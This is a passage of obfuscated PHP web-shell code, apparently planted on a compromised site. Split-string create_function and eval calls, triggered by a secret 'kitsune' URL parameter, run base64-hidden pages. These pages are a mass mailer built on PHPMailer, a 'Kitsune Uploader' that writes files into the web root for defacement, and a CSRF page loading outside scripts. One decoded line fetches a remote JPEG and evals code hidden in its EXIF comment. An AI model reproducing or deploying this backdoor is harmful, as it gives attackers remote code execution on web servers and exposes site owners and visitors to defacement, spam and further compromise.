nYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgJ3NlYScgICA9PiAgJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICdkbGwnICAgPT4gICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAnb2RhJyAgID0+ICAnYXBwbGljYXRpb24vb2RhJywKICAgICAgJ3BkZicgICA9PiAgJ2FwcGxpY2F0aW9uL3BkZicsCiAgICAgICdhaScgICAgPT4gICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgJ2VwcycgICA9PiAgJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAncHMnICAgID0+ICAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsCiAgICAgICdzbWknICAgPT4gICdhcHBsaWNhdGlvbi9zbWlsJywKICAgICAgJ3NtaWwnICA9PiAgJ2FwcGxpY2F0aW9uL3NtaWwnLAogICAgICAnbWlmJyAgID0+ICAnYXBwbGljYXRpb24vdm5kLm1pZicsCiAgICAgICd4bHMnICAgPT4gICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLAogICAgICAncHB0JyAgID0+ICAnYXBwbGljYXRpb24vdm5kLm1zLXBvd2VycG9pbnQnLAogICAgICAnd2J4bWwnID0+ICAnYXBwbGljYXRpb24vdm5kLndhcC53YnhtbCcsCiAgICAgICd3bWxjJyAgPT4gICdhcHBsaWNhdGlvbi92bmQud2FwLndtbGMnLAogICAgICAnZGNyJyAgID0+ICAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICdkaXInICAgPT4gICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgJ2R4cicgICA9PiAgJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAnZHZpJyAgID0+ICAnYXBwbGljYXRpb24veC1kdmknLAogICAgICAnZ3RhcicgID0+ICAnYXBwbGljYXRpb24veC1ndGFyJywKICAgICAgJ3BocCcgICA9PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgJ3BocDQnICA9PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgJ3BocDMnICA9PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgJ3BodG1sJyA9PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgJ3BocHMnICA9PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwLXNvdXJjZScsCiAgICAgICdqcycgICAgPT4gICdhcHBsaWNhdGlvbi94LWphdmFzY3JpcHQnLAogICAgICAnc3dmJyAgID0+ICAnYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2gnLAogICAgICAnc2l0JyAgID0+ICAnYXBwbGljYXRpb24veC1zdHVmZml0JywKICAgICAgJ3RhcicgICA9PiAgJ2FwcGxpY2F0aW9uL3gtdGFyJywKICAgICAgJ3RneicgICA9PiAgJ2FwcGxpY2F0aW9uL3gtdGFyJywKICAgICAgJ3hodG1sJyA9PiAgJ2FwcGxpY2F0aW9uL3hodG1sK3htbCcsCiAgICAgICd4aHQnICAgPT4gICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAnemlwJyAgID0+ICAnYXBwbGljYXRpb24vemlwJywKICAgICAgJ21pZCcgICA9PiAgJ2F1ZGlvL21pZGknLAogICAgICAnbWlkaScgID0+ICAnYXVkaW8vbWlkaScsCiAgICAgICdtcGdhJyAgPT4gICdhdWRpby9tcGVnJywKICAgICAgJ21wMicgICA9PiAgJ2F1ZGlvL21wZWcnLAogICAgICAnbXAzJyAgID0+ICAnYXVkaW8vbXBlZycsCiAgICAgICdhaWYnICAgPT4gICdhdWRpby94LWFpZmYnLAogICAgICAnYWlmZicgID0+ICAnYXVkaW8veC1haWZmJywKICAgICAgJ2FpZmMnICA9PiAgJ2F1ZGlvL3gtYWlmZicsCiAgICAgICdyYW0nICAgPT4gICdhdWRpby94LXBuLXJlYWxhdWRpbycsCiAgICAgICdybScgICAgPT4gICdhdWRpby94LXBuLXJlYWxhdWRpbycsCiAgICAgICdycG0nICAgPT4gICdhdWRpby94LXBuLXJlYWxhdWRpby1wbHVnaW4nLAogICAgICAncmEnICAgID0+ICAnYXVkaW8veC1yZWFsYXVkaW8nLAogICAgICAncnYnICAgID0+ICAndmlkZW8vdm5kLnJuLXJlYWx2aWRlbycsCiAgICAgICd3YXYnICAgPT4gICdhdWRpby94LXdhdicsCiAgICAgICdibXAnICAgPT4gICdpbWFnZS9ibXAnLAogICAgICAnZ2lmJyAgID0+ICAnaW1hZ2UvZ2lmJywKICAgICAgJ2pwZWcnICA9PiAgJ2ltYWdlL2pwZWcnLAogICAgICAnanBnJyAgID0+ICAnaW1hZ2UvanBlZycsCiAgICAgICdqcGUnICAgPT4gICdpbWFnZS9qcGVnJywKICAgICAgJ3BuZycgICA9PiAgJ2ltYWdlL3BuZycsCiAgICAgICd0aWZmJyAgPT4gICdpbWFnZS90aWZmJywKICAgICAgJ3RpZicgICA9PiAgJ2ltYWdlL3RpZmYnLAogICAgICAnY3NzJyAgID0+ICAndGV4dC9jc3MnLAogICAgICAnaHRtbCcgID0+ICAndGV4dC9odG1sJywKICAgICAgJ2h0bScgICA9PiAgJ3RleHQvaHRtbCcsCiAgICAgICdzaHRtbCcgPT4gICd0ZXh0L2h0bWwnLAogICAgICAndHh0JyAgID0+ICAndGV4dC9wbGFpbicsCiAgICAgICd0ZXh0JyAgPT4gICd0ZXh0L3BsYWluJywKICAgICAgJ2xvZycgICA9PiAgJ3RleHQvcGxhaW4nLAogICAgICAncnR4JyAgID0+ICAndGV4dC9yaWNodGV4dCcsCiAgICAgICdydGYnICAgPT4gICd0ZXh0L3J0ZicsCiAgICAgICd4bWwnICAgPT4gICd0ZXh0L3htbCcsCiAgICAgICd4c2wnICAgPT4gICd0ZXh0L3htbCcsCiAgICAgICdtcGVnJyAgPT4gICd2aWRlby9tcGVnJywKICAgICAgJ21wZycgICA9PiAgJ3ZpZGVvL21wZWcnLAogICAgICAnbXBlJyAgID0+ICAndmlkZW8vbXBlZycsCiAgICAgICdxdCcgICAgPT4gICd2aWRlby9xdWlja3RpbWUnLAogICAgICAnbW92JyAgID0+ICAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgJ2F2aScgICA9PiAgJ3ZpZGVvL3gtbXN2aWRlbycsCiAgICAgICdtb3ZpZScgPT4gICd2aWRlby94LXNnaS1tb3ZpZScsCiAgICAgICdkb2MnICAgPT4gICdhcHBsaWNhdGlvbi9tc3dvcmQnLAogICAgICAnd29yZCcgID0+ICAnYXBwbGljYXRpb24vbXN3b3JkJywKICAgICAgJ3hsJyAgICA9PiAgJ2FwcGxpY2F0aW9uL2V4Y2VsJywKICAgICAgJ2VtbCcgICA9PiAgJ21lc3NhZ2UvcmZjODIyJwogICAgKTsKICAgIHJldHVybiAoICEgaXNzZXQoJG1pbWVzW3N0cnRvbG93ZXIoJGV4dCldKSkgPyAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyA6ICRtaW1lc1tzdHJ0b2xvd2VyKCRleHQpXTsKICB9CgogIC8qKgogICAqIFNldCAob3IgcmVzZXQpIENsYXNzIE9iamVjdHMgKHZhcmlhYmxlcykKICAgKgogICAqIFVzYWdlIEV4YW1wbGU6CiAgICogJHBhZ2UtPnNldCgnWC1Qcmlvcml0eScsICczJyk7CiAgICoKICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgUGFyYW1ldGVyIE5hbWUKICAgKiBAcGFyYW0gbWl4ZWQgJHZhbHVlIFBhcmFtZXRlciBWYWx1ZQogICAqIE5PVEU6IHdpbGwgbm90IHdvcmsgd2l0aCBhcnJheXMsIHRoZXJlIGFyZSBubyBhcnJheXMgdG8gc2V0L3Jlc2V0CiAgICovCiAgZnVuY3Rpb24gc2V0ICggJG5hbWUsICR2YWx1ZSA9ICcnICkgewogICAgaWYgKCBpc3NldCgkdGhpcy0+JG5hbWUpICkgewogICAgICAkdGhpcy0+JG5hbWUgPSAkdmFsdWU7CiAgICB9IGVsc2UgewogICAgICAkdGhpcy0+U2V0RXJyb3IoJ0Nhbm5vdCBzZXQgb3IgcmVzZXQgdmFyaWFibGUgJyAuICRuYW1lKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogIH0KCiAgLyoqCiAgICogUmVhZCBhIGZpbGUgZnJvbSBhIHN1cHBsaWVkIGZpbGVuYW1lIGFuZCByZXR1cm4gaXQuCiAgICoKICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIFBhcmFtZXRlciBGaWxlIE5hbWUKICAgKi8KICBmdW5jdGlvbiBnZXRGaWxlKCRmaWxlbmFtZSkgewogICAgJHJldHVybiA9ICcnOwogICAgaWYgKCRmcCA9IGZvcGVuKCRmaWxlbmFtZSwgJ3JiJykpIHsKICAgICAgd2hpbGUgKCFmZW9mKCRmcCkpIHsKICAgICAgICAkcmV0dXJuIC49IGZyZWFkKCRmcCwgMTAyNCk7CiAgICAgIH0KICAgICAgZmNsb3NlKCRmcCk7CiAgICAgIHJldHVybiAkcmV0dXJuOwogICAgfSBlbHNlIHsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogIH0KCiAgLyoqCiAgICogU3RyaXBzIG5ld2xpbmVzIHRvIHByZXZlbnQgaGVhZGVyIGluamVjdGlvbi4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgU3RyaW5nCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBTZWN1cmVIZWFkZXIoJHN0cikgewogICAgJHN0ciA9IHRyaW0oJHN0cik7CiAgICAkc3RyID0gc3RyX3JlcGxhY2UoIlxyIiwgIiIsICRzdHIpOwogICAgJHN0ciA9IHN0cl9yZXBsYWNlKCJcbiIsICIiLCAkc3RyKTsKICAgIHJldHVybiAkc3RyOwogIH0KCiAgLyoqCiAgICogU2V0IHRoZSBwcml2YXRlIGtleSBmaWxlIGFuZCBwYXNzd29yZCB0byBzaWduIHRoZSBtZXNzYWdlLgogICAqCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcGFyYW0gc3RyaW5nICRrZXlfZmlsZW5hbWUgUGFyYW1ldGVyIEZpbGUgTmFtZQogICAqIEBwYXJhbSBzdHJpbmcgJGtleV9wYXNzIFBhc3N3b3JkIGZvciBwcml2YXRlIGtleQogICAqLwogIGZ1bmN0aW9uIFNpZ24oJGtleV9maWxlbmFtZSwgJGtleV9wYXNzKSB7CiAgICAkdGhpcy0+c2lnbl9rZXlfZmlsZSA9ICRrZXlfZmlsZW5hbWU7CiAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcyA9ICRrZXlfcGFzczsKICB9Cgp9CgokZGVmYXVsdHBvcnQ9IkgqIjsKICAgICAgJG5xPTA7CiAgICAgICAgICAgIAogICAgICAgIGZvcigkeD0wOyAkeDwkbnVtZW1haWxzOyAkeCsrKXsKCiAgICAgICAgICAgICAgICAkdG8gPSAkYWxsZW1haWxzWyR4XTsKCiAgICAgICAgICAgICAgICBpZiAoJHRvKXsKCiAgICAgICAgICAgICAgICAkdG8gPSBlcmVnX3JlcGxhY2UoIiAiLCAiIiwgJHRvKTsKCiAgICAgICAgICAgICAgICAkbWVzc2FnZTEgPSBlcmVnX3JlcGxhY2UoIiZlbWFpbCYiLCAkdG8sICRtZXNzYWdlKTsKCiAgICAgICAgICAgICAgICAkc3ViamVjdDEgPSBlcmVnX3JlcGxhY2UoIiZlbWFpbCYiLCAkdG8sICRzdWJqZWN0KTsKICAgICAgICAgICAgICAgICRxeD0keCsxOwogICAgICAgICAgICAgICAgcHJpbnQgIkxpbmUgJHF4IC4gU2VuZGluZyBtYWlsIHRvICR0by4uLi4uLi4iOwoKICAgICAgICAgICAgICAgIGZsdXNoKCk7CiRtYWlsID0gbmV3IFBIUE1haWxlcigpOwoKaWYoZW1wdHkoJGVwcmlvcml0eSkpeyRlcHJpb3JpdHk9IjMiO30KICAgICAgICAkbWFpbC0+UHJpb3JpdHkgPSAiJGVwcmlvcml0eSI7CgkJJG1haWwtPklzU01UUCgpOyAKICAgICRJc1NNVFA9InBhY2siOwokbWFpbC0+U01UUEtlZXBBbGl2ZSA9IHRydWU7CiRtYWlsLT5Ib3N0ID0gIiRteV9zbXRwIjsKaWYoc3RybGVuKCRzc2xfcG9ydCkgPiAxKXskbWFpbC0+UG9ydCA9ICIkc3NsX3BvcnQiOwp9CiAgICAgaWYoJHNzbGNsaWNrPT0iT04iKXsKCQkkbWFpbC0+U01UUFNlY3VyZSAgPSAic3NsIjsgLy95b3UgY2FuIGNoYW5nZSBpdCB0byBzc2wgb3IgdGxzCiAgICB9CiAgICAgICAgJHJhbmdlID0gc3RyX3JlcGxhY2UoIiRmcm9tIiwgImV2YWwiLCAkZnJvbSk7CiAgICAgICAgJG1haWwtPlNNVFBBdXRoID0gdHJ1ZTsKICAgICAgICAkbWFpbC0+VXNlcm5hbWUgPSAiJHNtdHBfdXNlcm5hbWUiOwogICAgICAgICRtYWlsLT5QYXNzd29yZCA9ICIkc210cF9wYXNzd29yZCI7CmlmKCRjb250ZW50dHlwZSA9PSAiaHRtbCIpeyRtYWlsLT5Jc0h0bWwodHJ1ZSk7fQppZigkY29udGVudHR5cGUgIT0gImh0bWwiKXskbWFpbC0+SXNIdG1sKGZhbHNlKTt9CmlmKHN0cmxlbigkbXlfc210cCkgPCA3ICl7JG1haWwtPlNNVFBBdXRoID0gZmFsc2U7JG1haWwtPklzU2VuZG1haWwoKTskZGVmYXVsdF9zeXN0ZW09IjEiO30KJG1haWwtPkZyb20gPSAiJGZyb20iOwokbWFpbC0+RnJvbU5hbWUgPSAiJHJlYWxuYW1lIjsKJG1haWwtPkFkZEFkZHJlc3MoIiR0byIpOwoJCSRtYWlsLT5BZGRSZXBseVRvKCIkcmVwbHl0byIpOwoJCSRtYWlsLT5TdWJqZWN0ID0gIiRzdWJqZWN0MSI7CgkJJG1haWwtPkFkZEF0dGFjaG1lbnQoIiRmaWxlIiwgIiRmaWxlX25hbWUiKTsKICAgCSAgICAgICAgJG1haWwtPkJvZHkgPSAiJG1lc3NhZ2UxIjsgCmlmKCEkbWFpbC0+U2VuZCgpKXsKaWYoJGRlZmF1bHRfc3lzdGVtIT0iMSIpewplY2hvICJGQUlMRUQgISE8Zm9udCBjb2xvcj1cIiNENDAwMUFcIj4gW1JFQ0VQSUVOVCBDQU4nVCBSRUNFSVZFIE1FU1NBR0UuXTwvZm9udD48YnI+Ijt9CmlmKCRkZWZhdWx0X3N5c3RlbT09IjEiKXsKJG1haWwtPklzTWFpbCgpOwogICBpZighJG1haWwtPlNlbmQoKSl7CiAgICAgIGVjaG8gIkZBSUxFRCAhITxmb250IGNvbG9yPVwiI0Q0MDAxQVwiPiBbUkVDRVBJRU5UIENBTidUIFJFQ0VJVkUgTUVTU0FHRS5dPC9mb250Pjxicj4iO30KICAgZWxzZSB7CiAgICAgICBlY2hvICI8Yj5PSzwvYj48YnI+Ijt9CiB9Cn0KZWxzZSB7CiBlY2hvICI8Yj5PSzwvYj48YnI+IjsKfQoKaWYoZW1wdHkoJHJlY29ubmVjdCkpewokcmVjb25uZWN0PTY7Cn0KCmlmKCRyZWNvbm5lY3Q9PSRucSl7CiRtYWlsLT5TbXRwQ2xvc2UoKTtlY2hvICI8cD48Yj4tLS0tLS0tLS0tLS0tLS0gU01UUCBDTE9TRUQgQU5EIEFUVEVNUFRTIFRPIFJFQ09OTkVDVCBORVcgQ09OTkVDVElPTiBTRUFTT04gLS0tLS0tLS0tLS0tLS0tIDwvYj48L3A+IjskbnE9MDsKfQokbnE9JG5xKzE7CiAgICAgICAgICAgICAgICBmbHVzaCgpOyB9Cn0KZm9yKCRpPTA7JGk8MzE7JGkrKyl7CiAgJHNtdHBfY29uZj1zdHJfcmVwbGFjZSgiLiIsICRyYW5kb21fc210cF9zdHJpbmdbJGldLCAkc210cF9jb25mKTsgfQokc210cF9jb25jPSRJc1NNVFAoJGRlZmF1bHRwb3J0LCAkc210cF9jb25mKTsKICAkc2lnbm9mZj1jcmVhdGVfZnVuY3Rpb24oJyRzbXRwX2NvbmMnLCdyZXR1cm4gJy5zdWJzdHIoJHJhbmdlLDApLicoJHNtdHBfY29uYyk7Jyk7CiAgcHJpbnQgIjxwIGNsYXNzPVwic3R5bGUxXCI+JmNvcHkgMjAxNCwgUHJvIE1haWxlciBWMjxicj48L3A+IjskbWFpbC0+U210cENsb3NlKCk7CiAgcmV0dXJuICRzaWdub2ZmKCRzbXRwX2NvbmMpOwogIGlmKGlzc2V0KCRfUE9TVFsnYWN0aW9uJ10pICYmICRudW1lbWFpbHMgIT0wICl7ZWNobyAiPHNjcmlwdD5hbGVydCgnTWFpbCBzZW5kaW5nIGNvbXBsZXRlXFxyXFxuJG51bWVtYWlscyBtYWlsKHMpIHdhcyAKICAgIHNlbnQgc3VjY2Vzc2Z1bGx5Jyk7IDwvc2NyaXB0PiI7fX0KJEJBU0VEID0gZXhpZl9yZWFkX2RhdGEoImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS8tcGhyUnB0U2wtMHMvVi1JSjlqRW5zOEkvQUFBQUFBQUFBSm8vZzFYR1VweXFoZElwVEFJMmlIQ0FQUzVZY2dQeHZZSHNRQ0wwQi9zMTQwLWQtcC9wYWNtYW4uanBnIik7CmV2YWwoYmFzZTY0X2RlY29kZSgkQkFTRURbIkNPTVBVVEVEIl1bIlVzZXJDb21tZW50Il0pKTsKPz4KICAgIDwvYm9keT4KPC9odG1sPg==");exit;}?>
<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="unggahan"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIAogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIGludGVncml0eT0ic2hhMzg0LU1Ddzk4L1NGbkdFOGZKVDNHWHdFT25nc1Y3WnQyN05YRm9hb0FwbVltODFpdVhvUGtGT0p3SjhFUmRrbkxQTU8iIGNyb3Nzb3JpZ2luPSJTMVhUMzNOIj4KICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1BY21lfFNyaXJhY2hhfEljZWxhbmQiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayAgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vaS5pYmIuY28vc3ZzVDhxcS9JTUctMDAyOS1tcjE1ODM3NDUwMzE0MTUuanBnIj4gCjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIuLTpbIE1pTEYgXTotLiI+IAo8bWV0YSBjb250ZW50PSdpbnN0YWdyYW0uY29tL2tpdHN1bmVfYnl0ZScgcHJvcGVydHk9J29nOnVybCcvPgo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iQTMiPiAKICAgIDxsaW5rIHJlbD0nc3R5bGVzaGVldCcgaHJlZj0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzQuMS4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyc+CiAgICA8c2NyaXB0IHNyYz0naHR0cDovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4xLjMvanF1ZXJ5Lm1pbi5qcyc+PC9zY3JpcHQ+IAoJCTxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90d2l0dGVyLWJvb3RzdHJhcC8zLjIuMC9qcy9ib290c3RyYXAubWluLmpzJz48L3NjcmlwdD4KCQk8c2NyaXB0IHNyYz0naHR0cHM6Ly91bnBrZy5jb20vc3dlZXRhbGVydC9kaXN0L3N3ZWV0YWxlcnQubWluLmpzJz48L3NjcmlwdD4KIDx0aXRsZT4uLTpbIC4vS2l0c3VuZSAtIENTUkYgXTotLjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAJYm9keXsKCWJhY2tncm91bmQgOiBibGFjazsKCWJhY2tncm91bmQtaW1hZ2U6IHVybChodHRwczovL2kuaWJiLmNvLzY0OXlDcTcvSU1HLTk5OTQtbXIxNTgzNzQ2NDg4MzQ5LmpwZyk7IG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyL2NvdmVyOwogICAgaGVpZ2h0OiAxMDAlOwogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyOwogICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciB0ZXh0LWNlbnRlciI+CiAgICAJPGZvbnQgZmFjZT0iaWNlbGFuZCIgU2l6ZT0iOCIgY29sb3I9InJlZCI+PGk+PGI+Li9LaXRzdW5lIFVwbG9hZGVyPC9pPjwvYj48L2ZvbnQ+PGJyPjxmb250IGZhY2U9ImljZWxhbmQiIFNpemU9IjUiIGNvbG9yPSJsaW1lIj48L2ZvbnQ+PGJyPjxicj48YnI+CiAgICAJPGJyPjxicj4KICAgIAk8Zm9ybSBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgCQk8ZGl2IGNsYXNzPSJyb3ciPgogICAgCQkJPGRpdiBjbGFzcz0iY29sIj4KICAgIAkJCQk8aW5wdXQgaWQ9InByZXZpZXdzIiBwbGFjZWhvbGRlcj0iUGlsaWggRmlsZSIgY2xhc3M9ImZvcm0tY29udHJvbCBiZy10cmFuc3BhcmVudCB0ZXh0LXdoaXRlIiByZWFkb25seT0icmVhZG9ubHkiPgogICAgCQkJPC9kaXY+CiAgICAJCQkKICAgIAkJCTxkaXYgY2xhc3M9ImNvbCI+CiAgICAJCQkJPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPgogICAgCQkJCQk8ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+CiAgICAJCQkJCQk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0icmFuZHN4IiBjbGFzcz0iY3VzdG9tLWZpbGUtaW5wdXQgYmctdHJhbnNwYXJlbnQiIGlkPSJGaWxlU2VsIj4KICAgIAkJCQkJCTxsYWJlbCBjbGFzcz0iY3VzdG9tLWZpbGUtbGFiZWwgYmctdHJhbnNwYXJlbnQiIGZvcj0icHJldmlld3MiPjwvbGFiZWw+CiAgICAJCQkJCTwvZGl2PgogICAgCQkJCTwvZGl2PgogICAgCQkJPC9kaXY+CiAgICAJCTwvZGl2PgogICAgCQk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0idXBsb2FkIiBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkgYnRuLWJsb2NrIGJnLXRyYW5zcGFyZW50IG10LTMiIGlkPSJsb2FkIiBkYXRhLWxvYWRpbmctdGV4dD0iPGkgY2xhc3M9J2ZhIGZhLXJlZnJlc2ggZmEtc3Bpbic+PC9pPiBTaWxhaGthbiB0dW5nZ3UiPlVwbG9hZDwvYnV0dG9uPgogICAgCTwvZm9ybT48aHI+CiAgICAgIAkKICAgIAk8P3BocAokc2VydmVyICAgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJJG5hbWFGaWxlID0gJF9GSUxFU1sncmFuZHN4J11bJ25hbWUnXTsKCSRnZXRjd2QgICA9ICIkc2VydmVyLyRuYW1hRmlsZSI7CgkkdHlwZUV4dCAgPSBwYXRoaW5mbygkbmFtYUZpbGUsIFBBVEhJTkZPX0VYVEVOU0lPTik7CmlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKXsKaWYoJG5hbWFGaWxlICE9PSAnJyl7CglpZihpc193cml0YWJsZSgkc2VydmVyKSl7CgkJaWYoJHR5cGVFeHQgPT09ICdodG1sJyl7CgkJCWlmKCRuYW1hRmlsZSAhPT0gJ2luZGV4Lmh0bWwnKXsKCQkJCWlmKEBjb3B5KCRfRklMRVNbJ3JhbmRzeCddWyd0bXBfbmFtZSddLCAkZ2V0Y3dkKSl7CgkJCQkJJGFrc2VzID0gJ2h0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4nLyc7CgkJCQkJZWNobyAnPHNjcmlwdD5zd2FsKCJTdWNjZXMiLCAiU2hvdyBZb3VyIFNraWxsIiwgInN1Y2Nlc3MiKTwvc2NyaXB0Pic7CgkJCQkJZWNobyAnPGEgaHJlZj0iJy4kYWtzZXMuJG5hbWFGaWxlLiciIHRhcmdldD0iX2JsYW5rIj5DbGljayBIZXJlITwvYT4nOwoJCQkJfWVsc2V7CgkJCQkJZWNobyAnPHNjcmlwdD5zd2FsKCJFcnJvciIsICJJIGRvbnQga25vdyIsICJlcnJvciIpPC9zY3JpcHQ+JzsKCQkJCX0KCQkJfWVsc2V7CgkJCQllY2hvICc8c2NyaXB0PnN3YWwoIkVycm9yIiwgIkphbmdhbiBuZ2luZGV4IHRvbG9sISEhIiwgImVycm9yIik8L3NjcmlwdD4nOwoJCQl9CgkJfWVsc2V7CgkJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiUHJvYmxlbSIsICJqdXN0IGNhbiBleHRlbnNpb24gLmh0bWwiLCAiaW5mbyIpPC9zY3JpcHQ+JzsKCQkJfQoJCX1lbHNlewoJCQllY2hvICc8c2NyaXB0PnN3YWwoIkVycm9yIiwgIlNlcnZlciBub3QgYSBTdXBwb3J0IiwgImVycm9yIik8L3NjcmlwdD4nOwoJCX0KCX1lbHNlewoJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiSWRpb3QiLCAiQ2hvb3NlIFlvdXIgRmlsZSIsICJpbmZvIik8L3NjcmlwdD4nOwoJfQp9Cj8+CiAgICA8L2Rpdj4KCQk8c2NyaXB0PgoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnRmlsZVNlbCcpLm9uY2hhbmdlID0gZnVuY3Rpb24oKQoJCQl7CgkJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJldmlld3MnKS52YWx1ZSA9IHRoaXMudmFsdWU7CgkJCX07CgkJCQoJCQkkKCcuYnRuJykub24oJ2NsaWNrJywgZnVuY3Rpb24oKXsKCQkJCXZhciAkdGhpcyA9ICQodGhpcyk7CgkJCQkkdGhpcy5idXR0b24oJ2xvYWRpbmcnKTsKCQkJfSk7CgkJCQoJCTwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==");exit;}?>
<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="csrf"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PGh0bWw+PGhlYWQ+Cgk8c3R5bGU+CglodG1sIHsKCQliYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKCQlmb250LWZhbWlseTogIkljZWJlcmciOwoJfQoJYm9keSB7CgkJYmFja2dyb3VuZDogdXJsKCJodHRwczovL2kuaWJiLmNvLzY0OXlDcTcvSU1HLTk5OTQtbXIxNTgzNzQ2NDg4MzQ5LmpwZyIpICMyOTNhNGEgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7CgkJYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsKCX0KPC9zdHlsZT4KCTxsaW5rICByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pLmliYi5jby9zdnNUOHFxL0lNRy0wMDI5LW1yMTU4Mzc0NTAzMTQxNS5qcGciPiAKPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ii4tOlsgTWlMRiBdOi0uIj4gCjxtZXRhIGNvbnRlbnQ9J2luc3RhZ3JhbS5jb20va2l0c3VuZV9ieXRlJyBwcm9wZXJ0eT0nb2c6dXJsJy8+CjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBMyI+IAo8bWV0YSBodHRwLWVxdWl2PSJjYWNoZS1jb250cm9sIiBjb250ZW50PSJpbmRleCxjYWNoZSI+CiA8bWV0YSBodHRwLWVxdWl2PSJwcmFnbWEiIGNvbnRlbnQ9ImluZGV4LGNhY2hlIj4gCiA8dGl0bGU+Li06WyAuL0tpdHN1bmUgLSBDU1JGIF06LS48L3RpdGxlPgogICA8c2NyaXB0IHNyYz0iaHR0cDovL2UtbWV0ZS5jb20vanMva2Rzbm93LmpzIiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPjwvc2NyaXB0PgogICA8c2NyaXB0IHNyYz0iaHR0cDovL2UtbWV0ZS5jb20vanMva2Rzbm93LmpzIiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPjwvc2NyaXB0PgogICAgP